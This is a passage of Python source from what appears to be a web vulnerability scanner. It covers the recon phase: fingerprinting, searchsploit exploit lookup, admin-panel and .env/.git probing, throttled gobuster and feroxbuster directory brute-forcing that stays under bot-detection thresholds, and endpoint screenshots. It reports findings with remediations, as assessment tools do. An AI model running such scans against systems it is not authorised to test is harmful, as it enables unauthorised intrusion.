                                _recon_cdn = _ww_plugin_to_cdn[_ww_pn_canon]
                                vc.log(f"[recon] CDN identified via WhatWeb plugin: {_recon_cdn}", "INFO")
                            elif _ww_pn_canon in _ww_plugin_to_edge:
                                _ww_pt_es = _ww_plugin_to_edge[_ww_pn_canon]
                                if _ww_pt_es not in _recon_edge_security:
                                    _recon_edge_security.append(_ww_pt_es)
                                    vc.log(f"[recon] Edge security identified via WhatWeb plugin: {_ww_pt_es}", "INFO")
                            _ww_versions.append((pname, version))
                            out.add_finding(
                                title=(f"Technology Identified: {pname} {version}".strip()
                                       if version else f"Technology Identified: {pname}"),
                                url=url, port=target["port"], risk="INFO",
                                description=(
                                    f"whatweb identified {pname}"
                                    f"{' ' + version if version else ''} at {url}{_hs}."
                                ),
                                output=((f"HTTP Status: {_ww_http_status}\n"
                                         if _ww_http_status else "")
                                        + f"Plugin: {pname}"
                                        + (f"\nVersion: {version}" if version else "")),
                                sources="whatweb", service=target["scheme"],
                                output_file=str(ww_out),
                                owasp="A06:2025 Vulnerable and Outdated Components",
                                nist="CM-7",
                                remediation=(
                                    "Ensure all identified technologies are up to date "
                                    "and properly configured."
                                ),
                                http_code=_ww_http_status or 0,
                            )
                        except Exception:
                            pass

                # Emit Missing Security Header findings for headers absent from whatweb output
                for _hdr_name, _hdr_risk, _unused, _hdr_desc, _hdr_nist, _hdr_remed \
                        in _SECURITY_HEADERS:
                    if _hdr_name == "Strict-Transport-Security" and not target["is_https"]:
                        continue
                    if _hdr_name not in ww_found_sec_hdrs:
                        out.add_finding(
                            title=f"Missing Security Header: {_hdr_name}",
                            url=url, port=target["port"], risk=_hdr_risk,
                            description=(
                                _hdr_desc
                                + (_hs if _hs else "")
                            ),
                            output=((f"HTTP Status: {_ww_http_status}\n"
                                     if _ww_http_status else "")
                                    + f"Missing: {_hdr_name}"),
                            affected=_url_rel_path(url, target["url"]),
                            sources="whatweb", service=target["scheme"],
                            output_file=str(ww_out),
                            owasp="A05:2025 Security Misconfiguration",
                            nist=_hdr_nist,
                            remediation=_hdr_remed,
                            http_code=_ww_http_status or 0,
                        )
        except Exception as e:
            out.log_error("whatweb", cmd, str(e))
    else:
        vc.log("[recon] whatweb not found — skipping tech fingerprint", "WARNING")

    # Write target profile — server, technology stack, CMS, WAF, CDN, structure, BI
    try:
        _tp_waf = ""
        if server_hdr:
            _tp_waf_m = _WAF_SERVER_RE.search(server_hdr)
            if _tp_waf_m:
                _tp_waf = _tp_waf_m.group(1)
        if not _tp_waf:
            _tp_waf_bm = _WAF_BODY_RE.search(body[:4096]) if body else None
            if _tp_waf_bm:
                _tp_waf = "WAF (body signature)"
        _write_target_profile(out,
            url=url,
            hostname=target["hostname"],
            server=server_hdr,
            powered_by=powered_by,
            cms=list(set(detected_cms)),
            technologies=[{"name": n, "version": v} for n, v in _ww_versions if n],
            waf=_tp_waf,
            cdn=_recon_cdn,
            web_structure=_recon_web_structure,
            bi_tools=_detected_bi,
            edge_security=_recon_edge_security,
        )
    except Exception:
        pass

    # ── Exploit lookup (searchsploit) ─────────────────────────────────────────
    # Build search terms from detected server header, CMS, and whatweb results.
    searchsploit = _find_tool("searchsploit")
    if searchsploit:
        _ss_terms: list = []
        _HAS_VER = re.compile(r'\d+\.\d+')
        if server_hdr:
            _sw_name, _sw_ver = _parse_software(server_hdr)
            if _sw_ver and _HAS_VER.search(_sw_ver):
                _ss_terms.append(f"{_sw_name} {_sw_ver}")
        if powered_by:
            _pw_name, _pw_ver = _parse_software(powered_by)
            if _pw_ver and _HAS_VER.search(_pw_ver):
                _ss_terms.append(f"{_pw_name} {_pw_ver}")
        for _pname, _pver in _ww_versions:
            if _pver and _HAS_VER.search(_pver):
                _ss_terms.append(f"{_pname} {_pver}")
        seen_ss: set = set()
        for term in _ss_terms[:5]:   # cap at 5 queries
            term = term.strip()
            if not term or term in seen_ss:
                continue
            seen_ss.add(term)
            ss_safe = re.sub(r'[^\w\-.]', '_', term)[:60]
            ss_out  = out.output_path(phase, f"searchsploit_{ss_safe}")
            cmd = [searchsploit, "--json", term]
            vc.log(f"[recon] searchsploit: {term!r}", "INFO")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                _register_proc(proc)
                stdout_ss, _ = proc.communicate(timeout=30)
                _deregister_proc(proc)
                ss_out.write_text(stdout_ss, encoding="utf-8", errors="replace")
                out.log_command("searchsploit", cmd, ss_out)
                ss_data    = json.loads(stdout_ss)
                exploits   = (ss_data.get("RESULTS_EXPLOIT", [])
                              + ss_data.get("RESULTS_SHELLCODE", []))
                if exploits:
                    titles_list = [e.get("Title", "") for e in exploits[:5]]
                    out.add_finding(
                        title=f"Public Exploit Available: {term}",
                        url=url, port=target["port"], risk="HIGH",
                        description=(
                            f"{len(exploits)} public exploit(s) found in ExploitDB for "
                            f"'{term}'. Review and patch before exposure."
                        ),
                        output="\n".join(f"- {t}" for t in titles_list),
                        sources="searchsploit", service=target["scheme"],
                        output_file=str(ss_out),
                        affected=url,
                        owasp="A06:2025 Vulnerable and Outdated Components", nist="SI-2",
                        remediation=f"Update or patch {term} to address known vulnerabilities.",
                    )
                    vc.log(f"[recon] searchsploit: {len(exploits)} hit(s) for {term!r}", "SUCCESS")
            except Exception as e:
                out.log_error("searchsploit", cmd, str(e))
    else:
        vc.log("[recon] searchsploit not found — skipping exploit lookup", "WARNING")

    vc.status(phase, "Recon", "running", "robots.txt/sitemap", 2, 10)
    for rpath in ["/robots.txt", "/sitemap.xml"]:
        try:
            r = sess.get(url.rstrip("/") + rpath, timeout=timeout)
            _rpath_status = r.status_code
            if r.status_code == 200 and len(r.text) > 10 \
                    and not _is_wildcard_match(r, wc_baseline):
                _rf_safe = rpath.lstrip("/").replace(".", "_")
                _rf_rq, _rf_rp = _save_http_evidence(out, phase, _rf_safe, r)
                vc.log(f"[recon] Found {rpath} ({len(r.text)} bytes)", "SUCCESS")
                try:
                    _write_structure_map(out, target,
                                         path_statuses={_base_path.rstrip("/") + rpath: _rpath_status},
                                         source="recon")
                except Exception:
                    pass
                if rpath == "/robots.txt":
                    # Also add any Disallow paths from robots.txt to the structure map
                    _raw_disallowed = re.findall(r'(?i)disallow:\s*(\S+)', r.text)
                    _allowed_paths  = re.findall(r'(?i)allow:\s*(\S+)', r.text)
                    disallowed = [p for p in _raw_disallowed
                                  if p not in ("/", "/*", "*")]
                    _robots_sm = {}
                    for _rp_path in _raw_disallowed + _allowed_paths:
                        if _rp_path not in ("/", "/*", "*"):
                            _robots_sm[_rp_path] = None
                    if _robots_sm:
                        try:
                            _write_structure_map(out, target, path_statuses=_robots_sm, source="robots.txt")
                        except Exception:
                            pass
                    if disallowed:
                        out.add_finding(
                            title="Sensitive Paths Disclosed in robots.txt",
                            url=url.rstrip("/") + rpath, port=target["port"], risk="INFO",
                            description=f"robots.txt disallows {len(disallowed)} path(s).",
                            output=r.text[:2000], sources="fracture-recon",
                            service=target["scheme"], output_file=f"{_rf_rq},{_rf_rp}",
                            affected="\n".join(disallowed[:20]),
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation="Review robots.txt for sensitive path disclosure.",
                            http_code=r.status_code,
                        )
        except Exception:
            pass

    vc.status(phase, "Recon", "running", "Admin panel detection", 3, 10)
    for apath in _ADMIN_PATHS:
        try:
            r = sess.get(url.rstrip("/") + apath, timeout=timeout, allow_redirects=False)
            if r.status_code in (200, 301, 302):
                # Wildcard baseline check: skip if response matches the catch-all pattern
                if _is_wildcard_match(r, wc_baseline):
                    continue
                # HTTP 200: panel accessible without authentication (CWE-306) → HIGH
                # HTTP 301/302: panel exists and redirects (e.g. to login) → MEDIUM
                _admin_risk = "HIGH" if r.status_code == 200 else "MEDIUM"
                _admin_desc = (
                    f"Administrative interface accessible without authentication at {apath} "
                    f"(HTTP {r.status_code}). CWE-306 (Missing Authentication for Critical Function)."
                    if r.status_code == 200 else
                    f"Administrative interface found at {apath} (HTTP {r.status_code}). "
                    f"Panel exists and redirects (likely to a login page)."
                )
                _admin_safe = apath.lstrip("/").replace("/", "_").replace(".", "_") or "root"
                _admin_rq, _admin_rp = _save_http_evidence(out, phase, f"admin_{_admin_safe}", r)
                _admin_full_url = url.rstrip("/") + apath
                out.add_finding(
                    title=f"Admin Panel Exposed: {apath}",
                    url=_admin_full_url, port=target["port"], risk=_admin_risk,
                    description=_admin_desc,
                    output=f"GET {apath} → {r.status_code}",
                    sources="fracture-recon", service=target["scheme"],
                    affected=_admin_full_url, output_file=f"{_admin_rq},{_admin_rp}",
                    owasp="A05:2025 Security Misconfiguration", nist="AC-3",
                    remediation="Restrict admin interfaces by IP allowlist or VPN.",
                    http_code=r.status_code,
                )
                vc.log(f"[recon] Admin panel: {apath} → {r.status_code}", "SUCCESS")
                try:
                    _admin_redir = None
                    if r.status_code in (301, 302, 307, 308):
                        _admin_redir = r.headers.get("Location", "")
                    _admin_full_path = _base_path.rstrip("/") + apath
                    _write_structure_map(out, target,
                                         path_statuses={_admin_full_path: r.status_code},
                                         path_redirects={_admin_full_path: _admin_redir} if _admin_redir else None,
                                         source="recon")
                except Exception:
                    pass
        except Exception:
            pass

    vc.status(phase, "Recon", "running", "Common paths probe", 4, 10)
    for cpath in _COMMON_PATHS:
        try:
            r = sess.get(url.rstrip("/") + cpath, timeout=timeout, allow_redirects=False)
            if r.status_code == 200 and cpath in ("/.git/HEAD", "/.env") \
                    and not _is_wildcard_match(r, wc_baseline):
                _cp_safe = cpath.lstrip("/").replace("/", "_").replace(".", "_")
                _cp_rq, _cp_rp = _save_http_evidence(out, phase, f"sensitive_path_{_cp_safe}", r)
                _cp_full_url = url.rstrip("/") + cpath
                out.add_finding(
                    title=f"Sensitive Path Accessible: {cpath}",
                    url=_cp_full_url, port=target["port"], risk="CRITICAL",
                    description=f"The path {cpath} is publicly accessible.",
                    output=f"GET {cpath} → {r.status_code}\n{r.text[:500]}",
                    sources="fracture-recon", service=target["scheme"],
                    affected=_cp_full_url, output_file=f"{_cp_rq},{_cp_rp}",
                    owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                    remediation=f"Block public access to {cpath}.",
                    http_code=r.status_code,
                )
        except Exception:
            pass

    vc.status(phase, "Recon", "running", "Directory discovery", 5, 10)
    # When a CDN or WAF is in front of the target, throttle directory busting.
    # Full-speed busting against Akamai/Cloudflare/Imperva triggers Bot Manager
    # rate-limiting or an IP block that poisons every subsequent probe in the scan
    # session.  5 threads with a short delay stays below typical bot-detection
    # thresholds while still completing discovery within the time budget.
    _buster_threads = "5" if _recon_cdn else "30"
    if _recon_cdn:
        vc.log(
            f"[recon] CDN/WAF detected ({_recon_cdn}) — throttling directory busting "
            f"to {_buster_threads} threads to avoid triggering bot-detection IP blocks",
            "INFO",
        )
    gobuster = _find_tool("gobuster")
    wordlist = _find_wordlist(
        "Discovery/Web-Content/raft-large-directories.txt",
        cfg.get("gobuster_wordlist", ""),
    )
    out_f    = out.output_path(phase, "gobuster_" + target["hostname"])
    if wc_baseline is not None:
        vc.log("[recon] Skipping directory brute-force (wildcard detected)", "INFO")
    elif gobuster and Path(wordlist).exists():
        cmd = [gobuster, "dir", "-u", url, "-w", wordlist, "-t", _buster_threads,
               "-q", "-k", "-o", str(out_f)]
        cmd += _buster_auth_flags(sess)
        vc.log("[recon] Running gobuster ...", "INFO")
        _gobuster_run(cmd, out_f, "recon", out)
    else:
        if gobuster:
            vc.log(f"[recon] gobuster found but wordlist missing: {wordlist}", "WARNING")
        else:
            vc.log("[recon] gobuster not found — probing top paths", "WARNING")
        found = []
        for mpath in _TOP_200_PATHS:
            try:
                r = sess.get(url.rstrip("/") + mpath, timeout=timeout, allow_redirects=False)
                if r.status_code in (200, 301, 302, 403):
                    if not _is_wildcard_match(r, wc_baseline):
                        found.append(f"{mpath} [{r.status_code}]")
            except Exception:
                pass
        if found:
            out_f.write_text("\n".join(found), encoding="utf-8")

    # Write gobuster dirs to structure map as soon as it finishes
    if out_f.exists():
        try:
            _sm_ps, _sm_rd = {}, {}
            _gob_res = _filter_buster_wildcards(
                _parse_gobuster_with_status(out_f, url), sess, timeout)
            for _gu, _gs, _gr in _gob_res:
                _sp = urllib.parse.urlparse(_gu).path or "/"
                _sm_ps[_sp] = _gs
                if _gr:
                    _sm_rd[_sp] = _gr
            if _sm_ps:
                _write_structure_map(out, target, path_statuses=_sm_ps,
                                     path_redirects=_sm_rd or None,
                                     evidence_files=[str(out_f)],
                                     source="gobuster")
        except Exception:
            pass

    # feroxbuster — recursive directory discovery
    feroxbuster = _find_tool("feroxbuster")
    if feroxbuster and Path(wordlist).exists():
        fer_out = out.output_path(phase, "feroxbuster_" + target["hostname"])
        _fer_threads = "5" if _recon_cdn else str(_SCAN_SEM.limit)
        # When a CDN/WAF is present, 403 and 401 responses come from the WAF
        # block page for every non-existent path — not from the origin app.
        # Including them causes feroxbuster to recurse into thousands of
        # false-positive directories, generating massive output file noise.
        _fer_sc = "200,204,301,302,307" if _recon_cdn else "200,204,301,302,307,401,403"
        cmd = [
            feroxbuster, "--url", url, "--wordlist", wordlist,
            "--depth", "2", "--threads", _fer_threads, "--quiet",
            "--status-codes", _fer_sc,
            "--output", str(fer_out), "--insecure",
            "--auto-tune", "--time-limit", "4m",
        ]
        if _recon_cdn:
            cmd += ["--rate-limit", "25"]
        cmd += _buster_auth_flags(sess)
        vc.log("[recon] Running feroxbuster ...", "INFO")
        _fer_proc = None
        try:
            _fer_proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(_fer_proc)
            _fer_proc.communicate(timeout=300)
            _deregister_proc(_fer_proc)
            out.log_command("feroxbuster", cmd, fer_out)
        except subprocess.TimeoutExpired:
            _fer_proc.kill()
            _fer_proc.communicate()
            _deregister_proc(_fer_proc)
            vc.log("[recon] feroxbuster timed out after 300s — killed", "WARNING")
        except Exception as e:
            if _fer_proc:
                try: _fer_proc.kill(); _fer_proc.communicate()
                except Exception: pass
                _deregister_proc(_fer_proc)
            out.log_error("feroxbuster", cmd, str(e))
        # Write feroxbuster dirs to structure map
        if fer_out.exists():
            try:
                _sm_ps, _sm_rd = {}, {}
                _fer_res = _filter_buster_wildcards(
                    _parse_feroxbuster_with_status(fer_out), sess, timeout)
                for _fu, _fs, _fr in _fer_res:
                    _sp = urllib.parse.urlparse(_fu).path or "/"
                    _sm_ps[_sp] = _fs
                    if _fr:
                        _sm_rd[_sp] = _fr
                if _sm_ps:
                    _write_structure_map(out, target, path_statuses=_sm_ps,
                                         path_redirects=_sm_rd or None,
                                         evidence_files=[str(fer_out)],
                                         source="feroxbuster")
            except Exception:
                pass
    elif feroxbuster:
        vc.log(f"[recon] feroxbuster found but wordlist missing: {wordlist}", "WARNING")

    # Second pass — raft-large-files.txt (finds files alongside directories)
    vc.status(phase, "Recon", "running", "File discovery", 6, 10)
    wordlist_files = _find_wordlist("raft-large-files.txt")
    _wf_exists = Path(wordlist_files).exists()
    if not _wf_exists:
        vc.log(f"[recon] file wordlist missing: {wordlist_files} — skipping files pass", "WARNING")
    else:
        # gobuster: skip on wildcard (results unreliable)
        if wc_baseline is not None:
            vc.log("[recon] Skipping file brute-force (wildcard detected)", "INFO")
        elif gobuster:
            gob_files_out = out.output_path(phase, "gobuster_files_" + target["hostname"])
            cmd = [gobuster, "dir", "-u", url, "-w", wordlist_files, "-t", "30",
                   "-q", "-k", "-o", str(gob_files_out)]
            cmd += _buster_auth_flags(sess)
            vc.log("[recon] Running gobuster (files) ...", "INFO")
            _gobuster_run(cmd, gob_files_out, "recon", out)
            # Write gobuster files to structure map
            if gob_files_out.exists():
                try:
                    _sm_ps, _sm_rd = {}, {}
                    _gobf_res = _filter_buster_wildcards(
                        _parse_gobuster_with_status(gob_files_out, url), sess, timeout)
                    for _gu, _gs, _gr in _gobf_res:
                        _sp = urllib.parse.urlparse(_gu).path or "/"
                        _sm_ps[_sp] = _gs
                        if _gr:
                            _sm_rd[_sp] = _gr
                    if _sm_ps:
                        _write_structure_map(out, target, path_statuses=_sm_ps,
                                             path_redirects=_sm_rd or None,
                                             evidence_files=[str(gob_files_out)],
                                             source="gobuster")
                except Exception:
                    pass
        # feroxbuster files
        if feroxbuster:
            fer_files_out = out.output_path(phase, "feroxbuster_files_" + target["hostname"])
            _fer_files_threads = "5" if _recon_cdn else str(_SCAN_SEM.limit)
            cmd = [
                feroxbuster, "--url", url, "--wordlist", wordlist_files,
                "--depth", "2", "--threads", _fer_files_threads, "--quiet",
                "--status-codes", _fer_sc,
                "--output", str(fer_files_out), "--insecure",
                "--auto-tune", "--time-limit", "4m",
            ]
            if _recon_cdn:
                cmd += ["--rate-limit", "25"]
            cmd += _buster_auth_flags(sess)
            vc.log("[recon] Running feroxbuster (files) ...", "INFO")
            _fer_files_proc = None
            try:
                _fer_files_proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                _register_proc(_fer_files_proc)
                _fer_files_proc.communicate(timeout=300)
                _deregister_proc(_fer_files_proc)
                out.log_command("feroxbuster", cmd, fer_files_out)
            except subprocess.TimeoutExpired:
                _fer_files_proc.kill()
                _fer_files_proc.communicate()
                _deregister_proc(_fer_files_proc)
                vc.log("[recon] feroxbuster (files) timed out after 300s — killed", "WARNING")
            except Exception as e:
                if _fer_files_proc:
                    try: _fer_files_proc.kill(); _fer_files_proc.communicate()
                    except Exception: pass
                    _deregister_proc(_fer_files_proc)
                out.log_error("feroxbuster", cmd, str(e))
            # Write feroxbuster files to structure map
            if fer_files_out.exists():
                try:
                    _sm_ps, _sm_rd = {}, {}
                    _ferf_res = _filter_buster_wildcards(
                        _parse_feroxbuster_with_status(fer_files_out), sess, timeout)
                    for _fu, _fs, _fr in _ferf_res:
                        _sp = urllib.parse.urlparse(_fu).path or "/"
                        _sm_ps[_sp] = _fs
                        if _fr:
                            _sm_rd[_sp] = _fr
                    if _sm_ps:
                        _write_structure_map(out, target, path_statuses=_sm_ps,
                                             path_redirects=_sm_rd or None,
                                             evidence_files=[str(fer_files_out)],
                                             source="feroxbuster")
                except Exception:
                    pass

    vc.status(phase, "Recon", "running", "Directory listing check", 7, 10)
    try:
        r = sess.get(url + "/", timeout=timeout)
        if re.search(r'Index of /|Directory listing|<title>Index of', r.text, re.I):
            _dl_out = out.output_path(phase, "dir_listing_" + target["hostname"])
            _dl_out.write_text(r.text[:10000], encoding="utf-8")
            out.add_finding(
                title="Directory Listing Enabled",
                url=url + "/", port=target["port"], risk="MEDIUM",
                description="The web server is configured to display a browsable directory index, exposing file structure and potentially sensitive files to unauthenticated users.",
                output=r.text[:500], sources="fracture-recon",
                service=target["scheme"], output_file=str(_dl_out),
                owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                remediation="Disable directory indexing (e.g., Options -Indexes in Apache; autoindex off in nginx) and ensure every directory contains an explicit index document.",
                http_code=r.status_code,
            )
    except Exception:
        pass

    vc.status(phase, "Recon", "running", "WordPress scan", 8, 10)
    _wp_discovered: list = []
    if "WordPress" in detected_cms:
        _wp_info = _phase_wordpress_scan(url, target, cfg, out, sess, phase, body)
        _wp_sm_ps: dict = {}
        _wp_sm_rd: dict = {}
        for _wu, _wc, _wr in _wp_info.get("discovered_paths", []):
            _wpath = urllib.parse.urlparse(_wu).path or "/"
            _wp_sm_ps[_wpath] = _wc
            if _wr:
                _wp_sm_rd[_wpath] = _wr
        if _wp_sm_ps:
            _write_structure_map(out, target, path_statuses=_wp_sm_ps,
                                 path_redirects=_wp_sm_rd or None,
                                 source="wayback")
        _wp_discovered = [_wu for _wu, *_ in _wp_info.get("discovered_paths", [])]

    vc.status(phase, "Recon", "complete", "Done", 10, 10)
    vc.log("[recon] Phase complete", "SUCCESS")
    return wc_baseline, _wp_discovered


# ─────────────────────────────────────────────
# Endpoint tools helpers (used after recon + crawl)
# ─────────────────────────────────────────────

def _parse_gobuster_output(filepath: Path, base_url: str) -> list:
    """Extract discovered URLs from a gobuster -q output file."""
    urls  = []
    base  = base_url.rstrip("/")
    for line in filepath.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # Redirect target takes priority: /path (Status: 301) [--> http://host/path/]
        m = re.search(r'-->\s*(https?://[^\]\s]+)', line)
        if m:
            urls.append(m.group(1).rstrip("/\\"))
            continue
        # Otherwise extract the leading path token
        m = re.match(r'(/\S+)', line)
        if m:
            urls.append(f"{base}{m.group(1)}")
    return urls


def _url_is_file(url: str) -> bool:
    """Return True if the URL's last path segment looks like a file (has a non-leading dot)."""
    path = urllib.parse.urlparse(url).path.rstrip("/")
    last = path.split("/")[-1] if path else ""
    dot  = last.find(".", 1)  # ignore leading dots (e.g. .htaccess is still a file, but index is not)
    return dot != -1


def _parse_feroxbuster_output(filepath: Path) -> list:
    """Extract discovered URLs from a feroxbuster output file."""
    urls = []
    for line in filepath.read_text(encoding="utf-8", errors="replace").splitlines():
        m = re.search(r'(https?://\S+)', line.strip())
        if m:
            urls.append(m.group(1).rstrip("/\\"))
    return urls


# Gobuster wildcard error: "the server returns a status code that matches the
# provided options for non existing urls. URL => STATUS (Length: N)"
_GOB_WILDCARD_RE = re.compile(r'Length:\s*(\d+)', re.I)


def _gobuster_run(
    cmd: list,
    out_f: "Path",
    label: str,
    out: "OutputManager",
    timeout: int = 300,
) -> bool:
    """Run gobuster, retrying with --exclude-length when the server's catch-all
    response triggers gobuster's wildcard detection.

    Returns True when results in *out_f* should be processed, False when the
    scan was skipped or failed and the output should be ignored.
    """
    try:
        proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        _register_proc(proc)
        _, gob_err = proc.communicate(timeout=timeout)
        _deregister_proc(proc)
    except Exception as e:
        out.log_error("gobuster", cmd, str(e))
        return False

    if gob_err and "server returns a status code" in gob_err.lower():
        m = _GOB_WILDCARD_RE.search(gob_err)
        if m:
            excl_len = m.group(1)
            vc.log(
                f"[{label}] gobuster wildcard detected (catch-all response "
                f"length {excl_len}) — retrying with --exclude-length {excl_len}",
                "INFO",
            )
            retry_cmd = cmd + ["--exclude-length", excl_len]
            try:
                proc2 = _popen(retry_cmd, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, text=True)
                _register_proc(proc2)
                _, gob_err2 = proc2.communicate(timeout=timeout)
                _deregister_proc(proc2)
                if gob_err2:
                    if "server returns a status code" in gob_err2.lower():
                        vc.log(
                            f"[{label}] gobuster wildcard persists after exclusion — skipping",
                            "INFO",
                        )
                        return False
                    vc.log(f"[{label}] gobuster stderr: {gob_err2[:500]}", "WARNING")
            except Exception as e2:
                out.log_error("gobuster", retry_cmd, str(e2))
                return False
        else:
            vc.log(f"[{label}] gobuster stderr: {gob_err[:500]}", "WARNING")
    elif gob_err:
        vc.log(f"[{label}] gobuster stderr: {gob_err[:500]}", "WARNING")

    out.log_command("gobuster", cmd, out_f)
    return True


def _capture_screenshot_to(ep_url: str, out_path: Path,
                            target: dict, cfg: dict) -> bool:
    """Take a headless screenshot of ep_url and save to out_path.
    Returns True on success."""
    if not _check_selenium():
        return False
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        opts = Options()
        opts.add_argument("--headless=new")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--disable-gpu")
        opts.add_argument("--ignore-certificate-errors")
        opts.add_argument("--window-size=1280,800")
        opts.add_experimental_option("excludeSwitches", ["enable-logging"])
        chrome_bin = _find_chrome_binary()
        if chrome_bin:
            opts.binary_location = chrome_bin
        hostname = target.get("hostname", "")
        _ip      = target.get("ip")
        if not _ip and hostname:
            try:
                _ip = socket.gethostbyname(hostname)
            except Exception:
                _ip = None
        if hostname and _ip and _ip != hostname:
            opts.add_argument(f"--host-resolver-rules=MAP {hostname} {_ip}")
        svc    = _build_chrome_service()
        driver = webdriver.Chrome(service=svc, options=opts)
        try:
            driver.set_page_load_timeout(15)
            try:
                driver.get(ep_url)
            except Exception:
                pass
            total_h = driver.execute_script(
                "return Math.max("
                "  document.body.scrollHeight,"
                "  document.documentElement.scrollHeight"
                ")"
            )
            driver.set_window_size(1280, max(800, int(total_h)))
            driver.save_screenshot(str(out_path))
            return True
        finally:
            try:
                driver.quit()
            except Exception:
                pass
    except Exception:
        return False


def _phase_endpoint_tools(
    discovered_urls: list, target: dict, cfg: dict, pm: ProgressManager,
    out: OutputManager, sess: requests.Session,
    wc_baseline=None,
    scope_hostnames: "set | None" = None,
) -> None:
    """Run screenshot, page crawl, and directory brute-force against each
    endpoint discovered by recon/crawl phases.  Capped to avoid runaway scans.
    """
    if not discovered_urls:
        return

    base_url     = target["url"].rstrip("/")
    timeout      = cfg.get("timeout", 10)
    max_ep       = cfg.get("max_endpoint_scan", 15)
    gobuster     = _find_tool("gobuster")
    feroxbuster  = _find_tool("feroxbuster")
    wordlist_dir = _find_wordlist(
        "Discovery/Web-Content/raft-large-directories.txt",
        cfg.get("gobuster_wordlist", ""),
    )
    # Read CDN/WAF from target_profile to restrict feroxbuster status codes
    try:
        _ep_tools_cdn = json.loads(
            (out.root / "target_profile.json").read_text()
        ).get("cdn", "") or ""
    except Exception:
        _ep_tools_cdn = ""
    _ep_fer_sc = "200,204,301,302,307" if _ep_tools_cdn else "200,204,301,302,307,401,403"
    _ep_fer_threads = "5" if _ep_tools_cdn else str(_SCAN_SEM.limit)
    wordlist_file = _find_wordlist("raft-large-files.txt")

    # Deduplicate, exclude base URL, cap count
    seen = {base_url}
    endpoints: list = []
    for u in discovered_urls:
        u = u.rstrip("/")
        if u and u not in seen:
            seen.add(u)
            endpoints.append(u)
            if len(endpoints) >= max_ep:
                break

    if not endpoints:
        return

    vc.log(f"[endpoint_tools] Processing {len(endpoints)} discovered endpoint(s)", "INFO")
    save_dir = out.root / "recon"
    save_dir.mkdir(parents=True, exist_ok=True)

    # Per-header aggregation: collect all URLs missing each header across
    # all endpoints and emit one consolidated finding per header at the end.
    _hdr_missing: dict = {}   # header_name -> [url, ...]
    _hdr_meta:    dict = {}   # header_name -> (risk, desc, nist, remed)
    _hdr_anchor:  dict = {}   # header_name -> first URL (used as finding anchor)
    _hdr_code:    dict = {}   # header_name -> http_code of first URL
    _hdr_resp:    dict = {}   # header_name -> {ep_url: Response} (all responses per header)

    # Interesting endpoint aggregation: group relative paths by domain so one
    # finding per domain is emitted rather than one per discovered URL.
    _ie_by_netloc: dict = {}   # netloc -> {"anchor": url, "paths": {rel: full_url}}
    _ie_crawl_out: dict = {}   # netloc -> most-recent crawl output file path

    for idx, ep_url in enumerate(endpoints):
        ep_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', ep_url.replace("://", "_"))[:50]
        vc.status("endpoint_tools", "Endpoint Tools", "running",
                  f"Endpoint {idx + 1}/{len(endpoints)}", idx, len(endpoints))
        vc.log(f"[endpoint_tools] {ep_url}", "INFO")

        # ── Screenshot ──────────────────────────────────────────────────────
        ep_shot = save_dir / f"screenshot_{ep_safe}.png"
        _ep_path_low = (urllib.parse.urlparse(ep_url).path or "/").lower()
        _ep_scope_ok = (scope_hostnames is None or _is_in_scope_url(ep_url, scope_hostnames))
        _ep_not_asset = not (_ep_path_low.endswith(".css") or _ep_path_low.endswith(".js"))
        _ep_screenshot_ok = _is_valid_endpoint_url(ep_url) and _ep_scope_ok and _ep_not_asset
        if _ep_screenshot_ok:
            try:
                _ss_check = sess.head(ep_url, timeout=min(timeout, 5), allow_redirects=True)
                _ep_screenshot_ok = 200 <= _ss_check.status_code < 300
            except Exception:
                _ep_screenshot_ok = False
        if _ep_screenshot_ok and _capture_screenshot_to(ep_url, ep_shot, target, cfg):
            _ep_rel = urllib.parse.urlparse(ep_url).path or "/"
            out.add_finding(
                title=f"Web Screenshot Captured: {_ep_rel}",
                url=ep_url, port=target["port"], risk="INFO",
                description=f"A screenshot of discovered endpoint {ep_url} was captured.",
                output=f"Saved: {ep_shot.name}",
                sources="fracture-screenshot", service=target["scheme"],
                output_file=str(ep_shot),
                owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                remediation="Review screenshot for exposed sensitive content.",
            )
            vc.log(f"[endpoint_tools] Screenshot: {ep_shot.name}", "SUCCESS")

        # ── Single-page crawl ────────────────────────────────────────────────
        page_data = _crawl_page(ep_url, sess, timeout, base_url)
        if not page_data.get("error"):
            ep_crawl_out = out.output_path("crawl", f"crawl_ep_{ep_safe}")
            ep_crawl_out.write_text(
                json.dumps({
                    "endpoint": ep_url,
                    "links": page_data.get("links", [])[:200],
                    "forms": page_data.get("forms", [])[:50],
                }, indent=2),
                encoding="utf-8",
            )
            _ep_scope = scope_hostnames or {target["hostname"]}
            for link in page_data.get("links", []):
                if (_INTERESTING_PATH_RE.search(link)
                        and _is_in_scope_url(link, _ep_scope)
                        and _is_valid_endpoint_url(link)):
                    _ie_nl  = urllib.parse.urlparse(link).netloc or link
                    _ie_rel = urllib.parse.urlparse(link).path or link
                    if _ie_nl not in _ie_by_netloc:
                        _ie_by_netloc[_ie_nl] = {"anchor": link, "paths": {}}
                    _ie_by_netloc[_ie_nl]["paths"][_ie_rel] = link
                    _ie_crawl_out[_ie_nl] = str(ep_crawl_out)

            # ── Source code download ─────────────────────────────────────────
            _ep_src_resp = page_data.get("response")
            _ep_page_ev = ""
            if _ep_src_resp is not None:
                try:
                    _ep_pgrq, _ep_pgrp = _save_http_evidence(
                        out, "crawl", f"ep_page_{ep_safe}", _ep_src_resp)
                    _ep_page_ev = json.dumps(
                        [{"url": ep_url, "req": str(_ep_pgrq), "resp": str(_ep_pgrp)}])
                except Exception:
                    pass
                _ep_src_file = out.output_path("recon", f"source_{ep_safe}.html")
                try:
                    _ep_src_file.write_text(_ep_src_resp.text or "", encoding="utf-8")
